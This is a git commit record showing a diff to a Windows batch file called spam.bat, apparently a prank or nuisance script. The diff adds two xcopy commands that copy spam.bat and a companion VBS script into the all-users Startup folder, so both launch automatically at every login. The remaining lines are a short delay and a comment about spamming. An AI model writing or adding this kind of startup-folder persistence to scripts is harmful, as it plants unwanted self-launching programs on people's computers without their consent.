4443fd8a6ce5bb12586447e025e0ee1ae29af9f9
Nex <87149262+LukeChemeriov@users.noreply.github.com>
2021-11-16 17:19:53 +0000

    Update spam.bat
    Moved to startup folder

--- spam.bat
+++ spam.bat
@@ -1,5 +1,6 @@
 @ echo off
-
+xcopy spam.bat C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\spam.bat
+xcopy cykablyat.vbs C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cykablyat.vbs
 rem sleep for 10 seconds
 ping -n 11 127.0.0.1>nul
 rem SPAM CYKA BLYAT
